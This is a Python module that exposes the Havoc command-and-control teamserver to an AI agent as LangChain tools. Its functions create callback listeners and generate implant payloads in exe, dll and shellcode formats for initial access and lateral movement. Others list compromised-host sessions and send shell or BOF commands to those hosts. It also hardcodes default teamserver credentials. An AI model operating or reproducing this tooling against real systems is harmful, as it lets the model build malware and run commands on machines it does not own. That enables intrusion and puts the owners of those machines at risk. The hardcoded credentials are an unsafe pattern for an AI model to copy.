"""Havoc C2 Framework integration tools.

Provides agent-facing tools for managing a Havoc teamserver:
- Checking teamserver status
- Managing listeners (HTTP/HTTPS/SMB)
- Generating demon payloads
- Monitoring active sessions/callbacks
- Executing post-exploitation modules

The Havoc teamserver runs in a separate container on sandbox-net,
spawned via ops_start("c2-havoc"). These tools communicate with
it via the Havoc REST API.
"""

from __future__ import annotations

import json
import os
from typing import Any

import httpx
from langchain_core.tools import tool

HAVOC_DEFAULT_HOST = "c2-havoc"
HAVOC_DEFAULT_PORT = 40056
HAVOC_DEFAULT_USER = "decepticon"
HAVOC_DEFAULT_PASS = "decepticon-havoc-c2"


def _json(data: Any) -> str:
    return json.dumps(data, indent=2, default=str, ensure_ascii=False)


def _havoc_url() -> str:
    host = os.environ.get("HAVOC_HOST", HAVOC_DEFAULT_HOST)
    port = os.environ.get("HAVOC_PORT", str(HAVOC_DEFAULT_PORT))
    return f"https://{host}:{port}"


def _havoc_verify() -> bool | str:
    """TLS verification for Havoc teamserver.

    Havoc generates self-signed certificates by default. Verification
    is controlled via ``HAVOC_VERIFY_TLS``. Defaults to ``true``.
    Set to ``false`` only for internal sandbox-net communication where
    the teamserver uses a self-signed cert.
    """
    val = os.environ.get("HAVOC_VERIFY_TLS", "true").strip().lower()
    if val in ("0", "false", "no", ""):
        return False  # noqa: S501 — operator explicitly disabled via env var
    if val in ("1", "true", "yes"):
        return True
    return val  # treat as CA bundle path


def _havoc_creds() -> tuple[str, str]:
    user = os.environ.get("HAVOC_USER", HAVOC_DEFAULT_USER)
    password = os.environ.get("HAVOC_PASS", HAVOC_DEFAULT_PASS)
    return user, password


@tool
def havoc_status() -> str:
    """Check Havoc C2 teamserver status and connectivity.

    WHEN TO USE: Before using any Havoc C2 features. Verifies the
    teamserver is running and accessible.

    Returns:
        JSON with connection status, version, and active sessions.
    """
    url = _havoc_url()
    try:
        resp = httpx.get(
            f"{url}/api/v1/status",
            verify=_havoc_verify(),
            timeout=10.0,
        )
        if resp.status_code == 200:
            return _json({"status": "online", "url": url, "data": resp.json()})
        return _json({"status": "error", "url": url, "status_code": resp.status_code})
    except httpx.HTTPError as exc:
        return _json(
            {
                "status": "unreachable",
                "url": url,
                "error": f"{type(exc).__name__}: {exc}",
                "hint": "Run ops_start('c2-havoc') to start the Havoc teamserver.",
            }
        )


@tool
def havoc_list_listeners() -> str:
    """List active Havoc C2 listeners.

    WHEN TO USE: To see what listeners are running on the teamserver
    before generating payloads or adding new listeners.
    """
    url = _havoc_url()
    user, password = _havoc_creds()
    try:
        resp = httpx.get(
            f"{url}/api/v1/listeners",
            auth=(user, password),
            verify=_havoc_verify(),
            timeout=10.0,
        )
        return _json(
            {
                "listeners": resp.json() if resp.status_code == 200 else [],
                "status_code": resp.status_code,
            }
        )
    except httpx.HTTPError as exc:
        return _json({"error": str(exc)})


@tool
def havoc_create_listener(
    name: str,
    listener_type: str = "https",
    host: str = "0.0.0.0",
    port: int = 443,
) -> str:
    """Create a new Havoc C2 listener.

    WHEN TO USE: When you need to set up a callback listener for
    generated demon payloads.

    Args:
        name: Listener name (e.g. "https-primary")
        listener_type: http, https, or smb
        host: Bind address
        port: Bind port
    """
    url = _havoc_url()
    user, password = _havoc_creds()
    payload = {
        "name": name,
        "type": listener_type,
        "host": host,
        "port": port,
    }
    try:
        resp = httpx.post(
            f"{url}/api/v1/listeners",
            json=payload,
            auth=(user, password),
            verify=_havoc_verify(),
            timeout=15.0,
        )
        return _json(
            {
                "created": resp.status_code in (200, 201),
                "listener": payload,
                "response": resp.text,
            }
        )
    except httpx.HTTPError as exc:
        return _json({"error": str(exc)})


@tool
def havoc_generate_payload(
    listener_name: str,
    payload_type: str = "demon",
    arch: str = "x64",
    format: str = "exe",
    output_path: str = "/workspace/payloads/demon.exe",
) -> str:
    """Generate a Havoc demon payload.

    WHEN TO USE: After setting up a listener, generate a payload
    to deploy on the target for initial access or lateral movement.

    Args:
        listener_name: Name of the listener to callback to
        payload_type: demon (default Havoc agent)
        arch: x64 or x86
        format: exe, dll, shellcode, or service_exe
        output_path: Where to write the generated payload
    """
    url = _havoc_url()
    user, password = _havoc_creds()
    payload = {
        "listener": listener_name,
        "type": payload_type,
        "arch": arch,
        "format": format,
    }
    try:
        resp = httpx.post(
            f"{url}/api/v1/payload",
            json=payload,
            auth=(user, password),
            verify=_havoc_verify(),
            timeout=60.0,
        )
        if resp.status_code == 200:
            from pathlib import Path

            Path(output_path).parent.mkdir(parents=True, exist_ok=True)
            Path(output_path).write_bytes(resp.content)
            return _json(
                {
                    "generated": True,
                    "path": output_path,
                    "size_bytes": len(resp.content),
                    "config": payload,
                }
            )
        return _json(
            {
                "error": "generation failed",
                "status_code": resp.status_code,
                "body": resp.text,
            }
        )
    except httpx.HTTPError as exc:
        return _json({"error": str(exc)})


@tool
def havoc_list_sessions() -> str:
    """List active Havoc demon sessions (callbacks).

    WHEN TO USE: After deploying payloads, check which targets
    have called back to the teamserver.
    """
    url = _havoc_url()
    user, password = _havoc_creds()
    try:
        resp = httpx.get(
            f"{url}/api/v1/agents",
            auth=(user, password),
            verify=_havoc_verify(),
            timeout=10.0,
        )
        sessions = resp.json() if resp.status_code == 200 else []
        return _json(
            {
                "active_sessions": len(sessions) if isinstance(sessions, list) else 0,
                "sessions": sessions,
            }
        )
    except httpx.HTTPError as exc:
        return _json({"error": str(exc)})


@tool
def havoc_task_agent(
    agent_id: str,
    command: str,
) -> str:
    """Send a command to an active Havoc demon session.

    WHEN TO USE: When you have an active callback and need to execute
    commands on the compromised host. Supports shell commands, BOF
    loading, and built-in demon commands.

    Args:
        agent_id: The demon session ID from havoc_list_sessions
        command: The command to execute (e.g. "shell whoami", "bof inline-execute ...")
    """
    url = _havoc_url()
    user, password = _havoc_creds()
    payload = {"agent_id": agent_id, "command": command}
    try:
        resp = httpx.post(
            f"{url}/api/v1/agents/{agent_id}/command",
            json=payload,
            auth=(user, password),
            verify=_havoc_verify(),
            timeout=30.0,
        )
        return _json(
            {
                "tasked": resp.status_code in (200, 201, 202),
                "response": resp.text,
            }
        )
    except httpx.HTTPError as exc:
        return _json({"error": str(exc)})


C2_HAVOC_TOOLS = [
    havoc_status,
    havoc_list_listeners,
    havoc_create_listener,
    havoc_generate_payload,
    havoc_list_sessions,
    havoc_task_agent,
]
